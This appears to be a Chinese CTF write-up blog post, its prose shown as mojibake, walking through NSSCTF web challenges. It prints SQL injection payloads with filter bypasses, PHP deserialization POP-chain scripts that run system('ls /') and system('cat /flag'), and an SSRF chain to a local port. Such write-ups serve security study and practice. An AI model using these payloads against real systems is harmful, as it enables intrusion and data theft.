å›¾ç‰‡å®åœ¨æ˜¯æ²¡çœ‹æ¸…é‚£ä¸ªé…’åº—å«å•¥åå­—<br>å±±æ°´é—´å¤è¿¹é…’åº—ç™¾åº¦åœ°å›¾æ‰¾åˆ°<br><img src="https://s1.ax1x.com/2022/11/08/xzmOSO.md.png" alt="xzmOSO.md.png"><br>è¾“å…¥å®¢æœç”µè¯å»æ‰å­—ç¬¦å°±è¡Œ<br><img src="https://s1.ax1x.com/2022/11/08/xzmqfK.md.png" alt="xzmqfK.md.png"></p><h2 id="numgame"><a href="#numgame" class="headerlink" title="numgame"></a>numgame</h2><p>å‰é¢æŠ“åŒ…å‘ç°1.jsï¼Œç„¶åæœ‰ä¸ªNsScTf.phpè¿™äº›æ­¥éª¤å…ˆè¿‡å½“æ—¶ä¸æ˜¯å¡åœ¨è¿™é‡Œ<br>è¿›å…¥NsScTf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">//hint: ä¸getç›¸ä¼¼çš„å¦ä¸€ç§è¯·æ±‚åè®®æ˜¯ä»€ä¹ˆå‘¢  </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123;  </span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>))  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¡åœ¨è¿™é‡Œï¼Œä¸€å¼€å§‹çœ‹é‚£ä¸ªhintä»¥ä¸ºæ˜¯ç”¨HEADè¯·æ±‚ä½†ä¸æ˜¯<br>åˆ©ç”¨<code>call_user_func</code>å‡½æ•°ï¼Œç›´æ¥çœ‹payloadï¼š<code>?p=Nss::Ctf</code>ç”¨å¤§å†™ç»•è¿‡æ­£åˆ™åŒ¹é…æ¨¡å¼æ˜¯mæ‰€ä»¥å¯ä»¥ç”¨å¤§å†™ç»•è¿‡ä¸»è¦æ˜¯è¿™é‡Œå¯ä»¥ç”¨<code>::</code>æ¥è¿›å…¥ctfè¿™ä¸ªå‡½æ•°<br><img src="https://s1.ax1x.com/2022/11/08/xznkp8.md.png" alt="xznkp8.md.png"><br>æç¤ºnss2,åŒæ ·çš„åˆ©ç”¨æ–¹æ³•<br><img src="https://s1.ax1x.com/2022/11/08/xzniff.png" alt="xzniff.png"><br>flagåœ¨æºç </p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>è¿™ä¸ªé¢˜å½“æ—¶æ²¡åšå‡ºæ¥ä¸€å¼€å§‹æ²¡æ‰¾åˆ°ç»•è¿‡æ–¹å¼ï¼Œåé¢æ²¡åšäº†</p><p>ç”¨postä¼ å‚ è¿‡æ»¤äº† <code>or ç©ºæ ¼ union</code><br>çˆ†è¡¨<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xzn31U.png" alt="xzn31U.png"><br>çˆ†åˆ—<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=database()%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xznGX4.png" alt="xznGX4.png"><br>å­—æ®µ<br><code>nss=0&#39;ununionion/**/select/**/1,2,group_concat(Secr3t,flll444g)/**/from/**/NSS_tb%23</code><br><img src="https://s1.ax1x.com/2022/11/08/xzn8cF.png" alt="xzn8cF.png"></p><h2 id="ez-1zpop"><a href="#ez-1zpop" class="headerlink" title="ez_1zpop"></a>ez_1zpop</h2><p>è¿™ä¸ªpopé“¾åšçš„æ—¶å€™æ²¡çœ‹æ‡‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;weclome&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;to NSS&#x27;</span>;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;  </span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();  </span><br><span class="line">   &#125;  </span><br><span class="line">  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) &amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)  </span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>;  </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>])) &#123;   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>]);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   <span class="title function_ invoke__">highlight_file</span>(__file__);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹finç±»ä¸­çš„fmm()å‡½æ•°ï¼Œ<code>$b($this-&gt;title);</code>è¿™ä¸€æ¡è¯­å¥å¦‚æœbä¸ºsystemè€Œtitleä¸ºls &#x2F;,é‚£ä¹ˆæ˜¯ä¸æ˜¯å°±æ‰§è¡ŒæŸ¥çœ‹æ ¹ç›®å½•ï¼Œæ€ä¹ˆè¿›å…¥è¿™ä¸ªå‡½æ•°å‘¢ï¼Ÿltç±»ä¸­toStringå¯ä»¥è¿›å…¥<code>return $this-&gt;impo-&gt;fmm();</code>é‚£ä¹ˆæ€ä¹ˆè¿›å…¥toStringå‘¢ï¼Œå½“å¯¹è±¡å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºæ—¶ä¼šè¿›å…¥toStringæ–¹æ³•ï¼Œçœ‹__destruct()é”€æ¯å¯¹è±¡æ—¶ä¼šè¾“å‡ºè¿™ä¸ªå¯¹è±¡ï¼Œè‡³æ­¤popé“¾å°±ç†æ¸…æ¥šäº†ï¼Œè¿™é‡Œå°±è¿›å…¥toStringæœ‰ç‚¹éš¾ç†è§£ï¼Œå…¶å®ƒè¿˜å¥½ï¼Œè¿™ä¸ªpopé“¾æ˜¯éœ€è¦è‡ªå·±å»æ„é€ å±é™©å‡½æ•°çš„æ‰§è¡Œï¼Œä»¥å‰æ²¡ç»ƒè¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$impo</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md51</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md52</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;impo = <span class="variable">$f</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;  </span><br><span class="line">        <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);<span class="comment">//è¿™é‡Œåšå‘½ä»¤æ‰§è¡Œ  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&quot;system&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;title = <span class="string">&quot;ls /&quot;</span>;  </span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lt</span>(<span class="variable">$a</span>);<span class="comment">//é€šè¿‡æ„é€ å‡½æ•°è®©this-&gt;impoä¸ºå¯¹è±¡é”€æ¯æ—¶è¿›å…¥toString  </span></span><br><span class="line"><span class="variable">$b</span>-&gt;md51[]=<span class="number">1</span>;<span class="comment">//é€šè¿‡æ•°ç»„ç»•è¿‡MD5  </span></span><br><span class="line"><span class="variable">$b</span>-&gt;md52[] = <span class="number">2</span>;  </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><h2 id="1z-unserialize"><a href="#1z-unserialize" class="headerlink" title="1z_unserialize"></a>1z_unserialize</h2><p>ä¹‹å‰æ²¡åšè¿‡è¿™ç§åˆ©ç”¨å‚æ•°æ‰§è¡Œå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;  </span><br><span class="line">       </span><br><span class="line">     <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">     </span>&#123;        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;lt;        <span class="variable">$a</span>(<span class="variable language_">$this</span>-&gt;lly);  </span><br><span class="line">     &#125;  </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>]);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;  </span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;    </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lyh</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;lt=<span class="string">&quot;assert&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;lly=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/11/08/xznbHs.png" alt="xznbHs.png"></p><h2 id="js-sign"><a href="#js-sign" class="headerlink" title="js_sign"></a>js_sign</h2><p>æŸ¥çœ‹æºç <br><img src="https://s1.ax1x.com/2022/11/08/xzuVC6.png" alt="xzuVC6.png"><br>é€šè¿‡tapcodeè§£ç flagå‡ºæ¥ä¸‹é¢è¿™ä¸²å­—ç¬¦ï¼Œä¸çŸ¥é“æ€ä¹ˆæäº¤äº†<br><img src="https://s1.ax1x.com/2022/11/08/xzuA4x.png" alt="xzuA4x.png"></p><h2 id="Power"><a href="#Power" class="headerlink" title="Power!"></a>Power!</h2><p>çœ‹æºç æœ‰æç¤º<br><img src="https://s1.ax1x.com/2022/11/08/xzuTG6.png" alt="xzuTG6.png"><br>å…¨éƒ¨çš„ä»£ç å°±ä¸æ”¾äº†å§æŒºé•¿çš„æ…¢æ…¢åˆ†æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨getæ–¹æ³•ä¼ å…¥<code>image_path=flag.php</code><br><img src="https://s1.ax1x.com/2022/11/08/xzu7RK.png" alt="xzu7RK.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuHxO.png" alt="xzuHxO.png"><br>flagåœ¨å†…ç½‘ï¼ŒSSRFï¼Œçœ‹ä¸€ä¸‹å“ªé‡Œèƒ½åˆ©ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123; <span class="comment">//flag</span></span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>); <span class="comment">//curl_exec() æ‰§è¡ŒcURLä¼šè¯ã€‚</span></span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥è¿›è¡ŒSSRFï¼Œè·Ÿä¸€ä¸‹è¿™ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);  <span class="comment">//æ‰§è¡Œè¿™é‡Œ</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>loadfile()</code>å¯ä»¥è¿›è¡Œè·³è½¬ï¼Œå†è·Ÿ<code>loadfile()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();   <span class="comment">//è¿™é‡Œè¿›å…¥loadfileï¼Œæ­¤æ–¹æ³•åœ¨å°è¯•è°ƒç”¨ç±»æ–¹æ³•ï¼Œè€Œæ–¹æ³•ä¸å­˜åœ¨æ—¶è¢«è°ƒç”¨</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><code>__call</code>æ–¹æ³•å¯ä»¥è¿›è¡Œè·³è½¬ï¼Œæƒ³åŠæ³•è¿›å…¥è¿™é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">            <span class="comment">//$a-&gt;local=&quot;http://127.0.0.1:65500/&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>(); <span class="comment">//$this-&gt;a=new FileViewer();æ‰§è¡Œcæ–¹æ³•ä½†æ˜¯ FileViewerç±»æ²¡æœ‰cæ–¹æ³•è¿›å…¥callæ–¹æ³•</span></span><br><span class="line">        